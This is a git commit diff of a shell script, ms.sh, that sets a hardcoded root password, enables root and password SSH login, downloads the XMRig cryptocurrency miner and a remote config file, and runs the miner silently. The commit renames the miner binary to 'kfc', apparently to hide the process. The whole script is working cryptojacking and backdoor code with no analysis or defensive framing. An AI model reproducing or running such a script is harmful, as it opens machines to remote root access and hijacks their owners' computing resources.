7a58cfff6ea981cc0121197a9f43f81fe4aa85ce
hanryme <hanryruiz93@gmail.com>
2024-11-06 09:14:24 +0900

    Update ms.sh

--- ms.sh
+++ ms.sh
@@ -1,12 +1,14 @@
 #!/bin/bash
-echo root:NP1215GP55*3*com | sudo chpasswd root
+echo root:NP1215GP55*3*commm | sudo chpasswd root
 sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 sudo service sshd restart
 sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
 tar -xf /root/xmrig.tar.gz -C /root
-chmod u+x ./xmrig
+cd /root
+mv xmrig kfc
+chmod u+x ./kfc
 sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/xs.json
 chmod u+x ./xs.json
-./xmrig --config=./xs.json >/dev/null 2>&1
+./kfc --config=./xs.json >/dev/null 2>&1
 ping aws.amazon.com
